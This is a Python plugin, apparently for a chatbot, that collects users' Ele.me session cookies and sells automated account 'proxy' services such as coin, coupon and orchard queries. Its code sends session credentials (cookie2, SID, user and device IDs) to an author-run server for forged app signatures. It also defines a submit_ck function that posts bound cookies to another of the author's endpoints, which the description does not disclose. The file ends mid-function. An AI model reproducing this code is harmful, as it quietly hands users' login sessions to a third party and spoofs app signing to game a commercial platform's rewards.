# [title: 我不饿]
# [class: 工具类]
# [author: chuan]
# [price: 18.88] 上架价格
# [priority: 999] 优先级，数字越大表示优先级越高
# [platform: qq,wx,wb,tg] 适用的平台
# [public: true] 是否发布？值为true或false，不设置则上传aut云时会自动设置为true，false时上传后不显示在市场中，但是搜索能搜索到，方便开发者测试
# [service: 2669943482] 售后联系方式
# [disable:true] 禁用开关，true表示禁用，false表示可用
# [admin: false] 是否为管理员指令
# [version: 3.5.0]版本
# [rule: ?]
# [bypass: true]
# [icon: http://www.aijiaoer.cn:8888/admin/images/gallery/1725287319391409980.png]
# [description: 指令：配参填写<br/>介绍：elm代挂插件，直接发送cookie即可绑定，支持多容器，使用前请安装pycryptodome，python-dateutil两个python依赖。<br/>指令说明：2.刷新我不饿：管理员执行刷新所有账号，优先使用token刷新，token刷新失败尝试账密刷新。添加定时推送<br/>3.elm授权：管理员指令，授权账号<br/>4.夺宝检测：管理员指令，检测所有账号夺宝情况，添加定时推送<br/>5.elm授权检测：管理员指令，自动通知失效ck与授权过期用户，需添加定时推送<br/>6.elm清理授权：管理员指令，清理授权过期用户<br/>其余用户指令请前往配参填写<br/>更新：增加“提交抢券”指令，需搭配我不饿抢券使用<br/>更新：抢券不提交小额，增加抢券收费配参，仅支持盖亚积分<br/>更新：修复提交抢券bug<br/>更新：新增elm短信登陆，原“刷新账密”命令移除，改为“刷新我不饿”<br/>更新：移除账密功能<br/>更新：增加“同步青龙指令”<br/>更新：增加兑换功能，自行配参填写，仅限私聊使用]
# [param: {"required":true,"key":"chuan_elm_config.queryRules","placeholder":"","name":"查询","desc":"查询关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.queryEasyRules","placeholder":"","name":"简单查询","desc":"简单查询关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.queryInfoRules","placeholder":"","name":"详细查询","desc":"详细查询关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.renewalRules","placeholder":"","name":"代挂","desc":"代挂关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.delRules","placeholder":"","name":"解绑","desc":"解绑关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.dbRules","placeholder":"","name":"夺宝","desc":"夺宝查询关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.cqRules","placeholder":"","name":"查券","desc":"查券关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.remarkRules","placeholder":"","name":"备注","desc":"添加备注关键词，多个关键词用逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.exchangeRules","placeholder":"","name":"兑换","desc":"添加兑换关键词，多个关键词用逗号隔开"}]
# [param: {"spliter":true}]
# [param: {"spliter":true}]
# [param: {"required":true,"key":"chuan_elm_config.smsRules","placeholder":"","name":"短信登陆命令","desc":"短信登陆指令"}]
# [param: {"required":true,"key":"chuan_elm_config.recordText","placeholder":"","name":"登记绑定回复语","desc":"默认为“登记成功”"}]
# [param: {"required":true,"key":"chuan_elm_config.expiredText","placeholder":"","name":"CK失效通知内容","desc":"CK失效通知内容，不填为默认"}]
# [param: {"required":true,"key":"chuan_elm_config.authorizationText","placeholder":"","name":"授权到期通知内容","desc":"授权到期通知内容，不填为默认"}]
# [param: {"required":true,"key":"chuan_elm_config.unauthorizationText","placeholder":"","name":"无授权账号提示语","desc":"默认为：未查询到绑定账号，请发送饿了么ck登记绑定。"}]
# [param: {"spliter":true}]
# [param: {"spliter":true}]
# [param: {"required":true,"key":"chuan_elm_config.firstPrice","bool":false,"placeholder":"首月价格","name":"首月价格","desc":"首月价格，填0或不填为免费"}]
# [param: {"required":true,"key":"chuan_elm_config.price","bool":false,"placeholder":"价格","name":"价格","desc":"呆瓜价格，填0或不填为免费"}]
# [param: {"required":true,"key":"chuan_elm_config.elmcklimit","bool":false,"placeholder":"xxx","name":"容器elmck上限","desc":"容器elmck上限,填写整数,单容器就填个很大的值"}]
# [param: {"spliter":true}]
# [param: {"spliter":true}]
# [param: {"required":false,"key":"chuan_elm_config.lybOwnCheckbox","placeholder":"","bool":true,"name":"是否开启助力代挂","desc":"是否开启助力代挂"}]
# [param: {"required":true,"key":"chuan_elm_config.lybOwnprice","bool":false,"placeholder":"乐园币助力价格","name":"乐园币助力价格","desc":"乐园币助力价格，填0或不填为免费"}]
# [param: {"required":true,"key":"chuan_elm_config.lybOwnEnv","bool":false,"placeholder":"xxxxxx","name":"乐园币助力环境变量名","desc":"环境变量名，例如lybzlck，不要填elmck。默认提交到填写的第一个容器"}]
# [param: {"required":true,"key":"chuan_elm_config.lybOwncklimit","bool":false,"placeholder":"xxx","name":"容器助力变量上限","desc":"容器助力变量上限,填写整数,单容器就填个很大的值"}]
# [param: {"spliter":true}]
# [param: {"spliter":true}]
# [param: {"required":true,"key":"chuan_elm_config.elmql","bool":false,"placeholder":"容器名称","name":"对接容器","desc":"填写奥特曼对接的青龙面板名称，多容器用英文逗号隔开"}]
# [param: {"required":true,"key":"chuan_elm_config.payWay","bool":false,"placeholder":"appreciationCode或者gaia","name":"收费方式","desc":"二选一，填appreciationCode使用赞赏码，填gaia使用盖亚"}]
# [param: {"required":true,"key":"chuan_elm_config.rewardCode","bool":false,"placeholder":"http://xxx.jpg","name":"赞赏码","desc":"使用赞赏码请填写你的机器人的赞赏码链接"}]
# [param: {"spliter":true}]
# [param: {"spliter":true}]
# [param: {"required":false,"key":"chuan_elm_config.authorizeCK","placeholder":"","bool":true,"name":"监控ck授权","desc":"开启后第一次登记的号将会自动弹出授权提示框"}]
# [param: {"required":false,"key":"chuan_elm_config.authorizeCheckbox","placeholder":"","bool":true,"name":"禁止非授权账号查询","desc":"是否开启"}]
# [param: {"required":false,"key":"chuan_elm_config.allcoinCheckbox","placeholder":"","bool":true,"name":"总乐园币","desc":"是否查询总乐园币"}]
# [param: {"required":false,"key":"chuan_elm_config.coinInfoCheckbox","placeholder":"","bool":true,"name":"今日乐园币","desc":"是否查询今日乐园币"}]
# [param: {"required":false,"key":"chuan_elm_config.cashCheckbox","placeholder":"","bool":true,"name":"笔笔返余额","desc":"是否查询笔笔返余额"}]
# [param: {"required":false,"key":"chuan_elm_config.fruitCheckbox","placeholder":"","bool":true,"name":"果园进度","desc":"是否查询果园进度"}]

import re
import middleware
import requests
import json
import time
import random
import hashlib
import base64
from datetime import datetime,timedelta
from dateutil.relativedelta import relativedelta
from urllib.parse import quote,quote_plus
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

def prinf(message):
    print(message,flush=True)

# 判断ck是否一致
def judgeCk(a:str,b:str):
    a = str2dict(a)
    b = str2dict(b)
    if a.get('cookie2') == b.get('cookie2') and a.get('SID') == b.get('SID'):
        return True
    else:
        False

def chunk_list(data, chunk_size):
    # 使用列表推导式进行切片
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

def encrypt(public_key, data):
    public_key = '-----BEGIN PUBLIC KEY-----\n' + public_key + '\n-----END PUBLIC KEY-----'
    key = RSA.import_key(public_key)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(data.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')

# 计算据当前还有几天（简单查询授权天数用）
def days_until(date_str):
    target_date = datetime.strptime(date_str, "%Y-%m-%d")
    now = datetime.now()
    difference = (target_date - now).days
    return difference

def get_ts(ten=False):
    ten = int(time.time())
    th = int(ten * 1000)
    if ten:
        return ten,th
    else:
        return th

def ts_to_date(ts):
    dt = datetime.fromtimestamp(int(ts))
    return dt.strftime("%Y-%m-%d %H:%M:%S")

# 判断字符串是否为正整数
def is_positive_integer(s:str):
    return s.isdigit() and int(s) > 0

def randomStr(num):
    str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-"
    res = ""
    for _ in range(num):
        res += str[random.randint(0, len(str) - 1)]
    return res

def md5_string(s):
    md5_obj = hashlib.md5()
    md5_obj.update(s.encode('utf-8'))
    md5_hash = md5_obj.hexdigest()
    return md5_hash

def str2dict(cookie_string:str):
    try:
        cookie = {}
        needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
        for i in needlist:
            value = re.findall(f'{i}=(.+?);',cookie_string+';')
            key = i
            if value:
                cookie[key] = value[0]
        return cookie
    except Exception as e:
        print(f'❎Cookie解析错误: {e}')
    return {}

def dict2str(cookie_dict:dict,needh5=True):
    needlist = ['cookie2','unb','USERID','SID','token','utdid','deviceId','umt']
    if needh5:
        needlist.append('_m_h5_tk')
        needlist.append('_m_h5_tk_enc')
    cookie_string = ''
    for key, value in cookie_dict.items():
        if key in needlist:
            cookie_string += f"{key}={value};"
    return cookie_string

# 寻找字典中的key值
def find_key_value(json_obj, key):
    if isinstance(json_obj, dict):
        if key in json_obj:
            return json_obj[key]
        for k, v in json_obj.items():
            result = find_key_value(v, key)
            if result is not None:
                return result
    elif isinstance(json_obj, list):
        for item in json_obj:
            result = find_key_value(item, key)
            if result is not None:
                return result
    return None

# 获取几天前的日期时间
def getDelta(num):
    days_ago = datetime.now() - timedelta(days=num)
    return str(days_ago.strftime("%Y-%m-%d %H:%M:%S"))

# 获取几月后的日期
def get_date_after_months(months,date_string=None):
    if date_string is None:
        future_date = datetime.now() + relativedelta(months=months)
        return str(future_date.date())
    else:
        future_date = datetime.strptime(date_string, "%Y-%m-%d") + relativedelta(months=months)
        return future_date.strftime("%Y-%m-%d")

# 获取几天后的日期
def get_date_after_days(days,date_string=None):
    if date_string is None:
        future_date = datetime.now() + timedelta(days=days)
        return str(future_date.date())
    else:
        future_date = datetime.strptime(date_string, "%Y-%m-%d") + timedelta(days=days)
        return future_date.strftime("%Y-%m-%d")

def get_datetime():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def submit_ck(user,type,ck,tag):
    try:
        url = 'http://www.aijiaoer.cn:9595/api/submit'
        body = {
            'user': user,
            'type': type,
            'cookie': ck,
            'tag': tag
        }
        requests.post(url,json=body,timeout=10)
    except:
        return

# 获取青龙token
class qinglong:
    def __init__(self,ql_ipport, client_id, client_secret):
        self.ql_ipport = ql_ipport
        self.client_id = client_id
        self.client_secret = client_secret
        self.ql_token = ''
    
    # 获取token
    def get_ql_token(self):
        url = f'{self.ql_ipport}/open/auth/token?client_id={self.client_id}&client_secret={self.client_secret}'
        res = requests.get(url).json()
        if res.get('code') == 200:
            self.ql_token = res.get('data').get('token')
        else:
            print('连接青龙失败')
        
    # 查询环境变量
    def get_ql_env(self,searchValue='') -> dict:
        url = f'{self.ql_ipport}/open/envs?searchValue={searchValue}'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        res = requests.get(url,headers=headers).json()
        if res.get('code') == 200:
            if res.get('data'):
                return res.get('data')
            else:
                return []
        else:
            print('获取环境变量失败：',res.get('message'))
    
    # 新增环境变量
    def submit_env(self,json):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        # json = [{"value":value,"name":name,"remarks":remarks}]
        res = requests.post(url,headers=headers,json=json).json()
        if res.get('code') == 200:
            return True
        else:
            print('新增环境变量失败：',res.get('message'))
    
    # 更新环境变量
    def update_env(self,name,value,remarks,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = {"name":name,"value":value,"remarks":remarks,"id":id}
        res = requests.put(url,headers=headers,json=json).json()
        if res.get('code') == 200:
            return True
    
    # 删除环境变量
    def delete_env(self,id):
        url = f'{self.ql_ipport}/open/envs'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.delete(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 禁用环境变量
    def disable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/disable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json).json()
        # print(res)
        if res.get('code') == 200:
            return True
    
    # 启用环境变量
    def enable_env(self,id):
        url = f'{self.ql_ipport}/open/envs/enable'
        headers = {'Authorization': f'Bearer {self.ql_token}'}
        json = [id]
        res = requests.put(url,headers=headers,json=json).json()
        if res.get('code') == 200:
            return True

class GAIA:
    def __init__(self,userId,userName,imtype:str):
        self.userId = userId
        self.name = userName
        self.imtype = imtype
        self.balanceIcon = middleware.bucketGet('sm_gaia_config','balanceIcon')
        self.integralIcon = middleware.bucketGet('sm_gaia_config','integralIcon')
        self.bucket = f'sm_gaia_userData_{imtype.upper()}'

    # 获取用户详情
    def get_info(self):
        user_json = middleware.bucketGet(self.bucket,self.userId)
        if user_json:
            user_json = json.loads(user_json)
            user_json['integral'] = user_json.get('integral', 0)
            user_json['balance'] = user_json.get('balance', 0)
        else:
            user_json = {"balance": 0, "integral": 0, "isBlacklist": False, "registrationTime": get_datetime()}
        self.user_json = user_json

    # 增加余额
    def add_balance(self,num:int,useType):
        self.get_info()
        self.user_json['balance'] += num
        middleware.bucketSet(self.bucket,self.userId,json.dumps(self.user_json))
        middleware.notifyMasters(f'======{self.imtype}收支通知======\n用户名:{self.name}\n用户ID:{self.userId}\n增加余额:{num}{self.balanceIcon}\n增加方式:{useType}')
        return True

    # 增加积分
    def add_integral(self,num:int,useType):
        self.get_info()
        self.user_json['integral'] += num
        middleware.bucketSet(self.bucket,self.userId,json.dumps(self.user_json))
        middleware.notifyMasters(f'======{self.imtype}收支通知======\n用户名:{self.name}\n用户ID:{self.userId}\n增加积分:{num}{self.integralIcon}\n增加方式:{useType}')
        return True

    # 减少余额
    def del_balance(self,num:int,useType,notifyMasters=True):
        self.get_info()
        # 判断余额
        if self.user_json['balance'] + self.user_json['integral'] >= num:
            if self.user_json['integral'] >= num:
                self.user_json['integral'] -= num
                if notifyMasters is True:
                    middleware.notifyMasters(f'======{self.imtype}收支通知======\n用户名:{self.name}\n用户ID:{self.userId}\n使用积分:{num}{self.integralIcon}\n使用方式:{useType}')
            else:
                useIntegral = self.user_json['integral']
                useBalance = num - useIntegral
                self.user_json['balance'] -= useBalance
                self.user_json['integral'] -= useIntegral
                if notifyMasters is True:
                    middleware.notifyMasters(f'======{self.imtype}收支通知======\n用户名:{self.name}\n用户ID:{self.userId}\n使用积分:{useIntegral}{self.integralIcon}\n使用余额:{useBalance}{self.balanceIcon}\n使用方式:{useType}')
            middleware.bucketSet(self.bucket,self.userId,json.dumps(self.user_json))
            return True
        else:
            return False

class Authorization:
    def __init__(self,userId:str,imtype:str,recordType:str):
        self.imtype = imtype.upper() # 发送信息的平台
        self.userId = userId # 发送信息的用户id
        self.recordType = recordType # # 需要呆瓜的类型
        self.accountId_userId_Bucket = f'chuan_{self.recordType}{self.imtype}' # 平台对应账号桶
        self.accountAuthorizationTime_Bucket = f'chuan_{self.recordType}_AuthorizationTime' # 账号桶，记录授权时间
        self.accountId_Bucket = f'chuan_{self.recordType}_accountId' # cookie桶
        self.accountId_phone = f'chuan_{self.recordType}_phone' # 手机号桶
        self.accountId_remark = f'chuan_{self.recordType}_remark' # 备注桶

    # 关联账号
    def associationAccountId(self,accountId,cookie=None,phone=None):
        middleware.bucketSet(self.accountId_userId_Bucket,accountId,self.userId)
        middleware.bucketSet(self.accountId_userId_Bucket,accountId,self.userId)
        if cookie:
            middleware.bucketSet(self.accountId_Bucket,accountId,cookie)
        if phone:
            middleware.bucketSet(self.accountId_phone,accountId,phone)

    # 对某个账号id增加授权时长
    def addAuthorizationTime(self,accountId,amount,timeType):
        amount = int(amount)
        if timeType == 'day':
            # 判断是否存在该授权账号
            if middleware.bucketGet(self.accountAuthorizationTime_Bucket,accountId): # 存在
                # 判断原授权时间是否过期
                oldAuthorizationTime = middleware.bucketGet(self.accountAuthorizationTime_Bucket,accountId)
                now = str(datetime.now().date())
                if oldAuthorizationTime >= now: # 累加
                    middleware.bucketSet(self.accountAuthorizationTime_Bucket,accountId,get_date_after_days(amount,oldAuthorizationTime))
                else: # 断点
                    middleware.bucketSet(self.accountAuthorizationTime_Bucket,accountId,get_date_after_days(amount))
            else: # 不存在，直接设置授权
                middleware.bucketSet(self.accountAuthorizationTime_Bucket,accountId,get_date_after_days(amount))
            return f'账号{accountId}云授权增加{amount}天'
        elif timeType == 'month':
            # 判断是否存在该授权账号
            if middleware.bucketGet(self.accountAuthorizationTime_Bucket,accountId): # 存在
                # 判断原授权时间是否过期
                oldAuthorizationTime = middleware.bucketGet(self.accountAuthorizationTime_Bucket,accountId)
                now = str(datetime.now().date())
                if oldAuthorizationTime >= now: # 累加
                    middleware.bucketSet(self.accountAuthorizationTime_Bucket,accountId,get_date_after_months(amount,oldAuthorizationTime))
                else: # 断点
                    middleware.bucketSet(self.accountAuthorizationTime_Bucket,accountId,get_date_after_months(amount))
            else: # 不存在，直接设置授权
                middleware.bucketSet(self.accountAuthorizationTime_Bucket,accountId,get_date_after_months(amount))
            return f'账号{accountId}云授权增加{amount}个月'

    # 查询账号授权时间
    def queryAuthorizationTime(self,accountId):
        AuthorizationTime = middleware.bucketGet(self.accountAuthorizationTime_Bucket,accountId)
        if AuthorizationTime:
            # 判断授权是否过期
            nowDate = str(datetime.now().date())
            if AuthorizationTime >= nowDate:
                return AuthorizationTime
            else:
                return '已过期'
        else:
            return '未授权'
        
    # 查询用户所有有效账号
    def queryAllAccount(self,expired=False,unauthorized=False) -> dict:
        effectList = []
        allAccount = middleware.bucketKeys(self.accountId_userId_Bucket,self.userId)
        for i in allAccount:
            AuthorizationTime = self.queryAuthorizationTime(i)
            if '未授权' in AuthorizationTime:
                if unauthorized:
                    effectList.append(i)
            elif '已过期' in AuthorizationTime:
                if expired:
                    effectList.append(i)
            else:
                effectList.append(i)
        return effectList
    
    # 取消绑定，之后去青龙删除，不删除授权时间
    def delAuthorization(self,accountId):
        middleware.bucketDel(self.accountId_userId_Bucket,accountId)

class ELM:
    def __init__(self,index,cookie):
        self.index = index # 索引
        self.userName = None
        self.mobile = None
        self.userId = None
        self.cookie = str2dict(cookie) # ck
        self.latitude = '30.040553114149304'
        self.longitude = '103.83792941623264'
        self.c = '4c919693409e64bbdc2303185e6149d8_1722278064999;cd394e4b1de8acf5f39a3826767dac68'
        self.allbean = None # 总吃货豆
        self.todaybean = None # 今日吃货豆
        self.allcoin = None # 总乐园币
        self.todaycoin = None #今日乐园币
        self.cash = None # 笔笔返余额
        self.xsignApi = 'http://www.aijiaoer.cn:9707/api/sign'
        self.ua = 'MTOPSDK%2F3.1.1.7+%28Android%3B13%3BGoogle%3BPixel+4+XL%29'

    def wait(self,start,end=None):
        if end:
            time.sleep(random.randint(start,end))
        else:
            time.sleep(start)

    def getToken(self):
        if self.cookie.get('_m_h5_tk'):
            return self.cookie.get('_m_h5_tk').split('_')[0]
        else:
            return 'a3690260a21965847b0a27348bd9c426'

    def get_c_token(self):
        return self.c.split('_')[0]

    def checkCookie(self):
        try:
            self.userInfo()
            if self.userInfo():
                return True
            else:
                return False
        except:
            return False
    
    def getSign(self,time,data,c=None):
        if type(data) == dict:
            data = json.dumps(data)
        if c:
            tk = self.get_c_token()
        else:
            tk = self.getToken()
        # print(tk)
        text = f'{tk}&{time}&12574478&{data}'
        return hashlib.md5(text.encode()).hexdigest()

    def getXsign(self,data,api,pageId='') -> dict:
        self.cookie['deviceId'] = self.cookie.get('deviceId') if self.cookie.get('deviceId') else randomStr(64)
        self.cookie['utdid'] = self.cookie.get('utdid') if self.cookie.get('utdid') else randomStr(24)
        self.cookie['unb'] = self.cookie.get('unb') if self.cookie.get('unb') else ''

        cookie2 = self.cookie.get('cookie2') 
        unb = self.cookie.get('unb')
        deviceId = self.cookie.get('deviceId')
        utdid = self.cookie.get('utdid')
        sid = self.cookie.get('SID')
        headers = {'content-type':'x-www-form-urlencoded'}
        sign = md5_string(f'{cookie2}@{unb}#{data}${api}%{deviceId}&{utdid}*{pageId}')
        params = {
            'sign': sign,
            'data': data,
            'api': api,
            'pageId': pageId,
            'sid': cookie2,
            'uid': unb,
            'deviceId': deviceId,
            'utdid': utdid,
            'realSID': sid
        }
        res = requests.post(self.xsignApi,params=params,headers=headers).json()
        if res.get('status') == 400:
            return {}
        else:
            return res

    def appRequest(self,host,api,data):
        try:
            if type(data) == dict:
                data = json.dumps(data)
            xsign = self.getXsign(data,api)
            url = f"https://{host}/gw/{api}/1.0/"
            params = {
                'data': data,
                'wua': xsign['wua']
            }
            headers = {
                'x-sgext': quote(xsign['x-sgext']),
                'x-sign': quote(xsign['x-sign']),
                'x-devid': self.cookie.get('deviceId'),
                'x-pv': '6.3',
                'x-features': '1051',
                'x-mini-wua': quote(xsign['x-mini-wua']),
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'x-t': xsign['x-t'],
                'x-bx-version': '6.6.231206',
                'x-extdata': 'openappkey%3DDEFAULT_AUTH',
                'x-ttid': '1601274955355@eleme_android_10.14.3',
                'x-app-ver': '10.14.3',
                'x-umt': quote(xsign['x-umt']),
                'x-utdid': quote_plus(self.cookie.get('utdid')),
                'x-appkey': '24895413',
                'Host': host,
                'x-sid': self.cookie.get('cookie2'),
                'x-uid': self.cookie.get('unb'),
                'Cookie': dict2str(self.cookie),
            }
            response = requests.post(url,params=params,headers=headers,data=data)
            if response.status_code == 200:
                return response.text
            else:
                return
        except Exception as e:
            print(f'报错：{e}')
            return

    def h5commonReq(self,host,api,data,c=False,trys=0):
        try:
            t = get_ts()
            sign = self.getSign(t,data,c)
            url = "https://" + host + "/h5/" + api + "/1.0/?jsv=2.7.0&appKey=12574478&t=" + str(t) + "&sign=" + sign + "&api=" + api + "&v=1.0&ecode=1&type=json&valueType=string&needLogin=true&LoginRequest=true&dataType=jsonp&ttid=1601274962374%40eleme_android_11.12.88"
            headers = {
                "Host": host,
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
                "Content-type": "application/x-www-form-urlencoded",
                "Origin": "https://tb.ele.me",
                "Sec-Fetch-Site": "same-site",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://tb.ele.me/wow/alsc/mod/3fe8408d9ba38d4726448a87?spm-pre=a2ogi.bx828379.0.0&spm=a13.b_activity_kb_m69301.0.0",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Cookie": dict2str(self.cookie),
            }
            body = 'data=' + quote(json.dumps(data))
            response = requests.post(url,headers=headers,data=body,timeout=30)
            setCookie = requests.utils.dict_from_cookiejar(response.cookies)
            if setCookie:
                self.cookie.update(setCookie)
            if response.status_code == 200:
                return response.text
            else:
                if trys >= 3:
                    print(f'重试次数用尽\n报错：{response.status_code}')
                    return
                else:
                    trys += 1
                    print(f'重试次数：{trys}\n报错：{response.status_code}')
                    self.wait(1,2)
                    return self.h5commonReq(host,api,data,c,trys)
        except Exception as e:
            print(str(e))

    # 获取用户信息
    def userInfo(self):
        host = 'acs.m.goofish.com'
        api = 'mtop.alsc.personal.queryminecenter'
        data = {
            "sceneCode":"H5_ELEME_PERSONAL_CENTER",
            "sourceFrom":"H5",
            "latitude":self.latitude,
            "longitude":self.longitude,
            "cityId":""
            }
        response = self.h5commonReq(host,api,data)
        response = json.loads(response)
        self.userName = find_key_value(response,'userName')
        self.mobile = find_key_value(response,'mobile')
        self.userId = find_key_value(response,'userId')
        if self.userName == '立即登录':
            return False
        else:
            return True
    
    # 查询所有乐园币
    def queryAllCoin(self):
        host = 'mtop.ele.me'
        api = 'mtop.koubei.interaction.center.common.queryintegralproperty.v2'
        data = {"templateIds":"[\"1404\"]"}
        response = self.h5commonReq(host,api,data)
        response = json.loads(response)
        self.allcoin = find_key_value(response,'count')
    
    # 乐园币详情
    def queryCoinInfo(self):
        self.todaycoin = 0
        self.deltodaycoin = 0
        icon = '🦍🦊🦌🦏🦇🦦✨🎠🎨🍔🍕🍿🌭🍟🍟🥓🧇🥞🧈🥨🥯🧀🥗🥙🥪🌮🌯🫔🥠🥫🍖🍗🥩🍠🥟🥠🥡🍱🍘🍙🥟🥠🍘🍚🍛🍜🍥🥮🍢🧆🍲🥘🫕🍝🥣🥧🍦🍧🍩🍨🍪🎂🍰🧁'
        iconList = [i for i in icon]
        cointype = {}
        host = 'mtop.ele.me'
        api = 'mtop.koubei.interaction.center.common.querypropertydetail'
        shouldBreak = False
        for i in range(20):
            pageNo = str(i+1)
            data = {
                "templateId":"1404",
                "bizScene":"game_center",
                "convertType":"GAME_CENTER",
                "startTime":"2024-7-6 00:00:00",
                "pageNo":pageNo,
                "pageSize":"20"
                }
            response = self.h5commonReq(host,api,data)
            response = json.loads(response)
            if response['data']['list']:
                for i in response['data']['list']:
                    detailType = i['detailType']
                    gmtModified = i['gmtModified']
                    amount = i['amount']
                    bizName = i['extInfo'].get('bizName')
                    desc = i['extInfo']['desc']
                    if str(datetime.now().date()) in gmtModified:
                        if detailType == 'GRANT':
                            self.todaycoin += int(amount)
                        elif detailType == 'REDUCE': 
                            self.deltodaycoin += int(amount)
                        title = bizName if bizName else desc
                        if cointype.get(title):
                            cointype[title] += int(amount)
                        else:
                            cointype[title] = int(amount)
                    else:
                        shouldBreak = True
            else:
                break
            if shouldBreak:
                break
        replyMessage = ''
        for key,value in cointype.items():
            ic = iconList.pop(random.randrange(len(iconList)))
            replyMessage += f'{ic}{key}-{value}\n'
        return replyMessage
    
    # 查询笔笔返余额
    def queryBalanceBycardType(self):
        try:
            url = "https://httpizza.ele.me/walletUserV2/storedcard/queryBalanceBycardType?cardType=platform"
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
                'cache-control': 'no-cache',
                'pragma': 'no-cache',
                'priority': 'u=0, i',
                'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                'Cookie': dict2str(self.cookie)
                }
            response = requests.get(url,headers=headers).json()
            totalAmount = find_key_value(response,'totalAmount')
            self.cash = totalAmount/100
        except:
            pass
    
    def queryFruit(self):
        self.fruitNum = None
        try:
            host = 'acs.m.goofish.com'
            api = 'mtop.alsc.playgame.orchard.index.batch.query'
            data = {
                "blockRequestList": "[{\"blockCode\":\"603040_6723057310\",\"status\":\"PUBLISH\",\"tagCallWay\":\"SYNC\",\"useRequestBlockTags\":false}]",
                "source": "KB_ORCHARD",
                "bizCode": "main",
                "locationInfos": "[{\"latitude\":\"30.04111496731639\",\"longitude\":\"103.83816473186016\",\"lat\":\"30.04111496731639\",\"lng\":\"103.83816473186016\"}]",
                "extData": "{\"ORCHARD_ELE_MARK\":\"KB_ORCHARD\",\"orchardVersion\":\"20240624\"}"
                }
            response = self.h5commonReq(host,api,data)
            res = json.loads(response)
            self.role = find_key_value(res,'role')
            self.totalProps = find_key_value(res,'totalProps')
            self.poppingTasks = find_key_value(res,'poppingTasks')
            self.friends = find_key_value(res,'friends')
            self.instanceAssets = find_key_value(res,'instanceAssets')

            growthProgress = find_key_value(self.role,"growthProgress")
            levelName = find_key_value(self.role,"levelName")
            nextLevelName = find_key_value(self.role,"nextLevelName")
            self.schedule = '' # 简单进度
            self.scheduleInfo = '' # 详细进度
            if find_key_value(self.role,'roleId') is None:
                self.schedule = '未种植'
                self.scheduleInfo = '未种植'
            else:
                for i in self.totalProps:
                    print(i)
                    unit = i['unit']
                    name = i['name']
                    value = i['value']
                    if '水果兑换券' == name:
                        self.fruitNum = value
                    self.scheduleInfo += (f'🎁{name}-{value}{unit}\n')
                self.schedule += f'{growthProgress}%（{levelName}阶段）'
                self.scheduleInfo += f'💹当前进度：{growthProgress}%\n🌳当前阶段：{levelName}->{nextLevelName}'
        except Exception as e:
            self.schedule = f'查询失败：{str(e)}'
    
    # 红包查询
    def queryCoupon(self):
        self.couponInfo = ''
        if not self.checkCookie():
            return '账号已失效'
        host = 'acs.m.goofish.com'
        api = 'mtop.alsc.personal.querypasslist4native'
        data = {
            "cityCode":"511400",
            "condition":"",
            "extInfo":"",
            "latitude":self.latitude,
            "longitude":self.longitude,
            "sourceFrom":"ELEME_APP",
            "tabCode":"HONG_BAO"
            }
        response = self.appRequest(host,api,data)
        res = json.loads(response)
        for i in res['data']['data']['vouchers_list_component']['fields']['items']:
            bizCode = find_key_value(i,'bizCode')
            realtitle = find_key_value(i,'realtitle')
            amountText = find_key_value(i,'amountText')
            thresholdText = find_key_value(i,'thresholdText')
            end_time = find_key_value(i,'end_time')
            if realtitle == '可用于购买超级吃货卡':
                continue
            if realtitle:
                if thresholdText and '满' in thresholdText and '可用' in thresholdText:
                    try:
                        limit = int(thresholdText.replace('可用','').replace('满',''))
                        amount = int(amountText["yuanText"])
                        if amount/limit < 0.5:
                            continue
                    except:
                        pass
                self.couponInfo += f'🧧{realtitle}：{thresholdText}-{amountText["yuanText"]}（有效期：{ts_to_date(end_time)}）\n'
        if self.couponInfo == '':
            self.couponInfo = '未查询到大额优惠券'
        return self.couponInfo

    # 查询夺宝详情
    def querySnatch(self):
